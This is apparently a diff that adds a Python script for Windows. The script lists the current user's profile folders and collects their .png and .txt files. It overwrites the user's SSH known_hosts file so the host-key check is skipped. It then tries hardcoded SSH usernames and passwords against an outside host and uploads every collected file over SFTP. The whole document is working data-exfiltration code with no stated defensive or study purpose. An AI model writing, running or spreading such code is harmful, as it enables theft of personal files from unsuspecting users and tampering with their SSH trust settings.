@@ -1,0 +1,134 @@
+import os
+from os import X_OK, W_OK
+import threading
+import paramiko
+from paramiko import SSHClient
+import paramiko.ssh_exception
+import sys
+import winreg
+
+
+get_current_logged_in_user = os.getlogin() #Gets username of the logged in user, e.g. whoami but without domain
+path1 = ["C:/Users/username"]
+path1 = [usernamechange.replace("username", get_current_logged_in_user) for usernamechange in path1] #replaces the 'username' in C:/Users/username with get_current_logged_in_user var
+
+dir_depot = [] #All directories found are put here before proceeding with the availability assessment
+dir_access_check = [] #Checks executable and writable permissions, those that fail stay in dir_depot, the others proceed to viable_dirs
+viable_dirs = [] #OK and usable directories for file creation and file execution
+
+for find_dirs in path1:
+    find_dirs = os.listdir(find_dirs)
+    for dir in find_dirs:
+        dir_depot.append(dir)
+
+
+for check_dirs in dir_depot: 
+    dirappendage = "C:/Users/"+get_current_logged_in_user+"/"
+    try:
+        os.chdir(dirappendage+check_dirs) 
+        dir_access_check.append(dirappendage+check_dirs) 
+    except:
+        continue
+
+
+for check_access_rights in dir_access_check: 
+    checkx = os.access(check_access_rights, mode=X_OK) #Executable permission
+    checkw = os.access(check_access_rights, mode=W_OK) #Writable permission
+    if checkx and checkw == True: #If both are true then add to viable_dirs
+        viable_dirs.append(check_access_rights)
+    elif checkx and checkw == False: #If both are false or one of them is then stay.
+        continue
+
+files_found_in_viable_dirs = []
+
+
+for vdirs in viable_dirs:
+    vdirsOSchdir = os.chdir(vdirs) #Changes what directory it works in based on the directories that are in viable_dirs
+    try:
+        vdirsOSlistdir = os.listdir() #Lists the content in the directory
+        files_found_in_viable_dirs.extend(vdirsOSlistdir) #Adds the content to the files_found_in_viable_dirs = []
+    except:
+        continue
+
+
+found_files = [] #Stored found files based on file_type
+found_files2 = [] #Stored found files based on file_type2
+
+def pngfinder(): #Test
+    file_type = ".png" #What files to check for with file_type
+    for find_the_files in files_found_in_viable_dirs:
+            if file_type in find_the_files: #Checks for files in files_found_in_viable_dirs based on file_type
+                found_files.append(find_the_files) #Appends found files with defined file_type
+
+def txtfinder(): #Test
+    file_type2 = ".txt" #What files to check for with file_type #Stored found files based on file_type
+    for find_the_files2 in files_found_in_viable_dirs:
+            if file_type2 in find_the_files2: #Checks for files in files_found_in_viable_dirs based on file_type
+                found_files2.append(find_the_files2) #Appends found files with defined file_type
+    
+pngthread=threading.Thread(target=pngfinder)
+txtfinder=threading.Thread(target=txtfinder)
+pngthread.run()
+txtfinder.run()
+
+found_files_storage = []
+found_files_storage.extend(found_files)
+found_files_storage.extend(found_files2)
+
+
+
+path2 = ["C:/Users/username/.ssh"]
+path2 = [usernamechange.replace("username", get_current_logged_in_user) for usernamechange in path2]
+str_path="".join(path2)
+
+#Auth v
+dst        = ""
+cryptoalgo = "" 
+key        = ""
+#Auth ^
+
+#Creates a known_hosts file to skip the authcheck question with the Auth info
+os.chdir(str_path)
+with open("known_hosts", "w") as known_hosts:
+    append=(dst, cryptoalgo, key)
+    str_append=" ".join(append)
+    known_hosts.write(str_append)
+
+
+client = SSHClient()
+
+Usernames = ["123", "456", "789", "101112"]
+Passwords = ["abc", "def", "ghi", "jkl"]
+
+client.load_system_host_keys()
+
+for Username in Usernames:
+    for Password in Passwords:
+        try:
+
+            client.connect(hostname=dst, port=22, username=Username, password=Password)
+            sftp_client = client.open_sftp()
+
+            for files_found_on_system in found_files_storage:
+                for vdirappendage in viable_dirs:
+                    try:
+                        file = files_found_on_system
+                        Local_File_Path = vdirappendage+"\\"+file
+                        Remote_File_Path = "HomeDir/"+file
+                        sftp_client.put(Local_File_Path, Remote_File_Path)
+                    except FileNotFoundError:
+                        continue
+
+            sftp_client.close()
+            print("Done")
+            sys.exit()
+            
+        except SyntaxError:
+            sys.exit()
+
+        except paramiko.AuthenticationException:
+            continue
+
+        except paramiko.ssh_exception.SSHException:
+            sys.exit()
+        
